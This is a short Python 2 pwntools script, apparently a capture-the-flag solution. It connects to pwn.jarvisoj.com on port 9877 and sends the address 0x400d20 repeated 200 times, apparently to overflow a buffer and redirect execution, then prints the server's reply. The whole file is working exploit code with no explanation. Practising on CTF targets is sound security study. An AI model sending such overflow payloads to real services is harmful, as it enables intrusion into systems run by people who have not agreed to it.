from pwn import*
s=remote('pwn.jarvisoj.com',9877)
s.sendline(p64(0x400d20)*200)
s.sendline()
print s.recvall()
